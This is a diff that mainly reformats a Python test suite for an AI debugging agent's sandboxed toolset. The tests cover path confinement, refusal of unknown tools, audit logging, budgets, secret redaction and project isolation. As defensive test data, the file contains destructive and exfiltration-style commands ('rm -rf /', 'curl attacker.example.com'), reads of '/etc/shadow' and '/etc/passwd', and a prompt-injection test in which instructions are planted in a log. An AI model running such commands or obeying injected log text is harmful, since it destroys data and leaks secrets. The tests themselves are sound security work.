@@ -80,8 +80,12 @@ async def _toolset(db_session, project, repository, snapshot, incident, session,
     ],
 )
 async def test_read_file_is_confined_to_the_pinned_snapshot(db_session, tmp_path, path):
-    project, _, repository, snapshot, incident, session = await _fixture(db_session, tmp_path)
-    toolset, _ = await _toolset(db_session, project, repository, snapshot, incident, session)
+    project, _, repository, snapshot, incident, session = await _fixture(
+        db_session, tmp_path
+    )
+    toolset, _ = await _toolset(
+        db_session, project, repository, snapshot, incident, session
+    )
     result = await toolset.dispatch("read_file", {"path": path})
     assert result.ok is False
     assert "not part of the pinned snapshot" in (result.reason or "")
@@ -90,8 +94,12 @@ async def test_read_file_is_confined_to_the_pinned_snapshot(db_session, tmp_path
 
 
 async def test_read_file_returns_only_the_requested_window(db_session, tmp_path):
-    project, _, repository, snapshot, incident, session = await _fixture(db_session, tmp_path)
-    toolset, _ = await _toolset(db_session, project, repository, snapshot, incident, session)
+    project, _, repository, snapshot, incident, session = await _fixture(
+        db_session, tmp_path
+    )
+    toolset, _ = await _toolset(
+        db_session, project, repository, snapshot, incident, session
+    )
     result = await toolset.dispatch(
         "read_file", {"path": "shop/checkout.py", "start_line": 6, "end_line": 8}
     )
@@ -103,36 +111,54 @@ async def test_read_file_returns_only_the_requested_window(db_session, tmp_path)
 
 
 async def test_blame_and_diff_refuse_unknown_paths(db_session, tmp_path):
-    project, _, repository, snapshot, incident, session = await _fixture(db_session, tmp_path)
-    toolset, _ = await _toolset(db_session, project, repository, snapshot, incident, session)
+    project, _, repository, snapshot, incident, session = await _fixture(
+        db_session, tmp_path
+    )
+    toolset, _ = await _toolset(
+        db_session, project, repository, snapshot, incident, session
+    )
     blame = await toolset.dispatch("get_blame", {"path": "/etc/shadow"})
     assert blame.ok is False
     assert "not part of the pinned snapshot" in (blame.reason or "")
 
 
 async def test_unknown_tool_names_are_refused_and_listed(db_session, tmp_path):
-    project, _, repository, snapshot, incident, session = await _fixture(db_session, tmp_path)
-    toolset, _ = await _toolset(db_session, project, repository, snapshot, incident, session)
+    project, _, repository, snapshot, incident, session = await _fixture(
+        db_session, tmp_path
+    )
+    toolset, _ = await _toolset(
+        db_session, project, repository, snapshot, incident, session
+    )
     for name in ("run_shell", "write_file", "exec", "git_push", "deploy", ""):
         result = await toolset.dispatch(name, {"command": "rm -rf /"})
         assert result.ok is False
         assert "unknown tool" in (result.reason or "")
-        assert "search_code" in (result.reason or ""), "the refusal lists what is available"
+        assert "search_code" in (
+            result.reason or ""
+        ), "the refusal lists what is available"
 
 
 async def test_every_call_is_audited_including_refusals(db_session, tmp_path):
-    project, _, repository, snapshot, incident, session = await _fixture(db_session, tmp_path)
-    toolset, _ = await _toolset(db_session, project, repository, snapshot, incident, session)
+    project, _, repository, snapshot, incident, session = await _fixture(
+        db_session, tmp_path
+    )
+    toolset, _ = await _toolset(
+        db_session, project, repository, snapshot, incident, session
+    )
     await toolset.dispatch("read_file", {"path": "shop/checkout.py"})
     await toolset.dispatch("read_file", {"path": "/etc/passwd"})
     await toolset.dispatch("run_shell", {"command": "rm -rf /"})
     await db_session.flush()
 
     rows = (
-        await db_session.execute(
-            select(DebugToolCall).where(DebugToolCall.session_id == session.id)
+        (
+            await db_session.execute(
+                select(DebugToolCall).where(DebugToolCall.session_id == session.id)
+            )
         )
-    ).scalars().all()
+        .scalars()
+        .all()
+    )
     assert len(rows) == 3
     by_tool = {(row.tool_name, row.status) for row in rows}
     assert ("read_file", ToolCallStatus.COMPLETED) in by_tool
@@ -141,24 +167,38 @@ async def test_every_call_is_audited_including_refusals(db_session, tmp_path):
     #: The audit row records *that* a call happened and how it ended, never the
     #: payload: it must not become a second copy of the repository.
     for row in rows:
-        assert row.result_bytes is not None or row.status is not ToolCallStatus.COMPLETED
+        assert (
+            row.result_bytes is not None or row.status is not ToolCallStatus.COMPLETED
+        )
         assert "Demo commerce" not in (row.result_summary or "")
         assert row.error is None or len(row.error) < 500
 
 
 async def test_arguments_are_trimmed_before_storage(db_session, tmp_path):
-    project, _, repository, snapshot, incident, session = await _fixture(db_session, tmp_path)
-    toolset, _ = await _toolset(db_session, project, repository, snapshot, incident, session)
+    project, _, repository, snapshot, incident, session = await _fixture(
+        db_session, tmp_path
+    )
+    toolset, _ = await _toolset(
+        db_session, project, repository, snapshot, incident, session
+    )
     await toolset.dispatch(
         "search_code",
-        {"query": "x" * 1000, "Authorization": "Bearer sk-secret-value", "nested": {"a": 1}},
+        {
+            "query": "x" * 1000,
+            "Authorization": "Bearer sk-secret-value",
+            "nested": {"a": 1},
+        },
     )
     await db_session.flush()
     row = (
-        await db_session.execute(
-            select(DebugToolCall).where(DebugToolCall.session_id == session.id)
+        (
+            await db_session.execute(
+                select(DebugToolCall).where(DebugToolCall.session_id == session.id)
+            )
         )
-    ).scalars().first()
+        .scalars()
+        .first()
+    )
     assert len(row.arguments["query"]) <= 200
     assert "Authorization" in row.arguments, "the key is kept for the audit trail"
     assert "nested" not in row.arguments, "non-scalar arguments are not stored"
@@ -168,30 +208,44 @@ async def test_arguments_are_trimmed_before_storage(db_session, tmp_path):
 # Project and session isolation (§56)
 # ---------------------------------------------------------------------------
 async def test_tools_cannot_read_another_projects_telemetry(db_session, tmp_path):
-    project, _, repository, snapshot, incident, session = await _fixture(db_session, tmp_path)
-    other_project, other_env, other_component = await build_project(db_session, name="Other")
+    project, _, repository, snapshot, incident, session = await _fixture(
+        db_session, tmp_path
+    )
+    other_project, other_env, other_component = await build_project(
+        db_session, name="Other"
+    )
     other_incident = await build_incident(
         db_session, other_project, other_env, other_component
     )
     await db_session.commit()
 
-    toolset, _ = await _toolset(db_session, project, repository, snapshot, incident, session)
+    toolset, _ = await _toolset(
+        db_session, project, repository, snapshot, incident, session
+    )
     logs = await toolset.dispatch("get_logs", {"limit": 50})
     assert logs.ok is True
     returned = {row["message"] for row in logs.data["logs"]}
     assert returned, "the project's own logs are visible"
     other_logs = (
-        await db_session.execute(
-            select(DebugToolCall).where(DebugToolCall.session_id == session.id)
+        (
+            await db_session.execute(
+                select(DebugToolCall).where(DebugToolCall.session_id == session.id)
+            )
         )
-    ).scalars().all()
+        .scalars()
+        .all()
+    )
     assert all(row.project_id == project.id for row in other_logs)
     assert other_incident.id != incident.id
 
 
 async def test_get_trace_refuses_a_foreign_trace_id(db_session, tmp_path):
-    project, _, repository, snapshot, incident, session = await _fixture(db_session, tmp_path)
-    toolset, _ = await _toolset(db_session, project, repository, snapshot, incident, session)
+    project, _, repository, snapshot, incident, session = await _fixture(
+        db_session, tmp_path
+    )
+    toolset, _ = await _toolset(
+        db_session, project, repository, snapshot, incident, session
+    )
     result = await toolset.dispatch("get_trace", {"trace_id": "trace-does-not-exist"})
     assert result.ok is False
     assert "not in this project" in (result.reason or "")
@@ -224,7 +278,9 @@ async def test_missing_snapshot_disables_every_code_tool(db_session, tmp_path):
 
 
 async def test_code_search_cannot_reach_a_foreign_snapshot(db_session, tmp_path):
-    project, _, repository, snapshot, incident, session = await _fixture(db_session, tmp_path)
+    project, _, repository, snapshot, incident, session = await _fixture(
+        db_session, tmp_path
+    )
     other_project, _, _ = await build_project(db_session, name="Other")
     (tmp_path / "other").mkdir(parents=True, exist_ok=True)
     _, other_snapshot, _ = await build_repository(
@@ -232,7 +288,9 @@ async def test_code_search_cannot_reach_a_foreign_snapshot(db_session, tmp_path)
     )
     await db_session.commit()
 
-    toolset, _ = await _toolset(db_session, project, repository, snapshot, incident, session)
+    toolset, _ = await _toolset(
+        db_session, project, repository, snapshot, incident, session
+    )
     result = await toolset.dispatch("search_code", {"query": "CheckoutService"})
     assert result.ok is True
     assert result.data["symbols"] or result.data["source_matches"]
@@ -243,15 +301,19 @@ async def test_code_search_cannot_reach_a_foreign_snapshot(db_session, tmp_path)
     from app.models.code import CodeSymbol
 
     rows = (
-        await db_session.execute(
-            select(CodeSymbol).where(
-                CodeSymbol.snapshot_id == other_snapshot.id,
-                CodeSymbol.qualified_name.in_(
-                    [item["qualified_name"] for item in result.data["symbols"]]
-                ),
+        (
+            await db_session.execute(
+                select(CodeSymbol).where(
+                    CodeSymbol.snapshot_id == other_snapshot.id,
+                    CodeSymbol.qualified_name.in_(
+                        [item["qualified_name"] for item in result.data["symbols"]]
+                    ),
+                )
             )
         )
-    ).scalars().all()
+        .scalars()
+        .all()
+    )
     assert other_snapshot.id != snapshot.id
     assert not any(
         item["qualified_name"] in {row.qualified_name for row in rows}
@@ -260,14 +322,18 @@ async def test_code_search_cannot_reach_a_foreign_snapshot(db_session, tmp_path)
     )
     for item in result.data["symbols"]:
         owned = (
-            await db_session.execute(
-                select(CodeSymbol).where(
-                    CodeSymbol.snapshot_id == snapshot.id,
-                    CodeSymbol.file_path == item["file_path"],
-                    CodeSymbol.qualified_name == item["qualified_name"],
+            (
+                await db_session.execute(
+                    select(CodeSymbol).where(
+                        CodeSymbol.snapshot_id == snapshot.id,
+                        CodeSymbol.file_path == item["file_path"],
+                        CodeSymbol.qualified_name == item["qualified_name"],
+                    )
                 )
             )
-        ).scalars().first()
+            .scalars()
+            .first()
+        )
         assert owned is not None, "every hit belongs to the session's own snapshot"
 
 
@@ -275,7 +341,9 @@ async def test_code_search_cannot_reach_a_foreign_snapshot(db_session, tmp_path)
 # Budgets (§39)
 # ---------------------------------------------------------------------------
 async def test_run_budget_stops_further_calls(db_session, tmp_path):
-    project, _, repository, snapshot, incident, session = await _fixture(db_session, tmp_path)
+    project, _, repository, snapshot, incident, session = await _fixture(
+        db_session, tmp_path
+    )
     toolset, budget = await _toolset(
         db_session, project, repository, snapshot, incident, session, max_calls=2
     )
@@ -291,15 +359,19 @@ async def test_run_budget_stops_further_calls(db_session, tmp_path):
 
 async def test_session_budget_counts_calls_already_stored(db_session, tmp_path):
     """A fresh turn cannot reset the session's total (§39)."""
-    project, _, repository, snapshot, incident, session = await _fixture(db_session, tmp_path)
-    toolset, _ = await _toolset(db_session, project, repository, snapshot, incident, session)
+    project, _, repository, snapshot, incident, session = await _fixture(
+        db_session, tmp_path
+    )
+    toolset, _ = await _toolset(
+        db_session, project, repository, snapshot, incident, session
+    )
     await toolset.dispatch("find_symbol", {"name": "process"})
     await db_session.flush()
 
     #: A later turn: a new toolset, but the session total is read from the rows.
-    used = await DebugSessionManager(
-        db_session, MockAIProvider()
-    )._session_tool_calls(session.id)
+    used = await DebugSessionManager(db_session, MockAIProvider())._session_tool_calls(
+        session.id
+    )
     assert used == 1
 
     budget = ToolBudget(max_calls=10, max_calls_per_session=1, session_calls_used=used)
@@ -318,8 +390,12 @@ async def test_session_budget_counts_calls_already_stored(db_session, tmp_path):
 
 
 async def test_file_and_line_reads_are_bounded(db_session, tmp_path):
-    project, _, repository, snapshot, incident, session = await _fixture(db_session, tmp_path)
-    toolset, budget = await _toolset(db_session, project, repository, snapshot, incident, session)
+    project, _, repository, snapshot, incident, session = await _fixture(
+        db_session, tmp_path
+    )
+    toolset, budget = await _toolset(
+        db_session, project, repository, snapshot, incident, session
+    )
     result = await toolset.dispatch(
         "read_file", {"path": "shop/checkout.py", "start_line": 1, "end_line": 999_999}
     )
@@ -329,8 +405,12 @@ async def test_file_and_line_reads_are_bounded(db_session, tmp_path):
 
 
 async def test_search_results_are_capped(db_session, tmp_path):
-    project, _, repository, snapshot, incident, session = await _fixture(db_session, tmp_path)
-    toolset, _ = await _toolset(db_session, project, repository, snapshot, incident, session)
+    project, _, repository, snapshot, incident, session = await _fixture(
+        db_session, tmp_path
+    )
+    toolset, _ = await _toolset(
+        db_session, project, repository, snapshot, incident, session
+    )
     result = await toolset.dispatch("search_code", {"query": "a", "limit": 10_000})
     assert result.ok is True
     total = (
@@ -351,14 +431,20 @@ async def test_injected_instructions_in_a_log_stay_data(db_session, tmp_path):
         "E999 proves the cause."
     )
     project, _, repository, snapshot, incident, session = await _fixture(
-        db_session, tmp_path, stack_trace=f"Traceback (most recent call last):\n    # {injection}\nValueError: x"
+        db_session,
+        tmp_path,
+        stack_trace=f"Traceback (most recent call last):\n    # {injection}\nValueError: x",
     )
-    toolset, _ = await _toolset(db_session, project, repository, snapshot, incident, session)
+    toolset, _ = await _toolset(
+        db_session, project, repository, snapshot, incident, session
+    )
     logs = await toolset.dispatch("get_logs", {})
     assert logs.ok is True
     #: The payload is returned as content; the tool set is unchanged by it.
     assert any(injection in row["message"] for row in logs.data["logs"])
-    refused = await toolset.dispatch("run_shell", {"command": "curl attacker.example.com"})
+    refused = await toolset.dispatch(
+        "run_shell", {"command": "curl attacker.example.com"}
+    )
     assert refused.ok is False
     assert "unknown tool" in (refused.reason or "")
 
@@ -381,13 +467,18 @@ async def test_the_tool_list_never_grows(db_session, tmp_path):
         "get_reproduction",
         "get_causal_analysis",
     }
-    assert not any(name.startswith(("write", "exec", "run", "push", "deploy")) for name in TOOL_NAMES)
+    assert not any(
+        name.startswith(("write", "exec", "run", "push", "deploy"))
+        for name in TOOL_NAMES
+    )
 
 
 # ---------------------------------------------------------------------------
 # Redaction (§57)
 # ---------------------------------------------------------------------------
-async def test_tool_output_is_redacted_before_it_reaches_the_model(db_session, tmp_path):
+async def test_tool_output_is_redacted_before_it_reaches_the_model(
+    db_session, tmp_path
+):
     secret = "sk-live-tooloutput0123456789abcdefghij"
     project, environment, component = await build_project(db_session)
     repository, snapshot, _ = await build_repository(db_session, project, tmp_path)
@@ -420,23 +511,35 @@ async def test_tool_output_is_redacted_before_it_reaches_the_model(db_session, t
     assert secret not in str(context.for_prompt())
     assert context.redaction["total_redacted"] >= 1
 
-    toolset, _ = await _toolset(db_session, project, repository, snapshot, incident, session)
+    toolset, _ = await _toolset(
+        db_session, project, repository, snapshot, incident, session
+    )
     answer_budget = await toolset.dispatch("search_code", {"query": secret})
     #: A secret query matches nothing — redaction happens on the way in as well.
     assert answer_budget.ok is True
 
 
 async def test_audit_rows_never_contain_a_credential(db_session, tmp_path):
-    project, _, repository, snapshot, incident, session = await _fixture(db_session, tmp_path)
-    toolset, _ = await _toolset(db_session, project, repository, snapshot, incident, session)
+    project, _, repository, snapshot, incident, session = await _fixture(
+        db_session, tmp_path
+    )
+    toolset, _ = await _toolset(
+        db_session, project, repository, snapshot, incident, session
+    )
     await toolset.dispatch("search_code", {"query": "password=hunter2hunter2"})
     await db_session.flush()
     row = (
-        await db_session.execute(
-            select(DebugToolCall).where(DebugToolCall.session_id == session.id)
+        (
+            await db_session.execute(
+                select(DebugToolCall).where(DebugToolCall.session_id == session.id)
+            )
         )
-    ).scalars().first()
-    assert "hunter2" in row.arguments["query"], "the query is the audit subject, not a secret"
+        .scalars()
+        .first()
+    )
+    assert (
+        "hunter2" in row.arguments["query"]
+    ), "the query is the audit subject, not a secret"
     assert row.result_summary and "hunter2" not in row.result_summary
 
 
@@ -444,7 +547,9 @@ async def test_analysis_writes_nothing_to_the_repository(db_session, tmp_path):
     """The phase analyses; it never modifies. Proven on the working tree."""
     import os
 
-    project, _, repository, snapshot, incident, session = await _fixture(db_session, tmp_path)
+    project, _, repository, snapshot, incident, session = await _fixture(
+        db_session, tmp_path
+    )
     root = repository.local_path
     before = {
         os.path.join(base, name): os.path.getsize(os.path.join(base, name))
@@ -457,7 +562,11 @@ async def test_analysis_writes_nothing_to_the_repository(db_session, tmp_path):
         session, incident=incident, repository=repository, snapshot=snapshot
     )
     await manager.ask(
-        session, "what should I inspect?", incident=incident, repository=repository, snapshot=snapshot
+        session,
+        "what should I inspect?",
+        incident=incident,
+        repository=repository,
+        snapshot=snapshot,
     )
     after = {
         os.path.join(base, name): os.path.getsize(os.path.join(base, name))
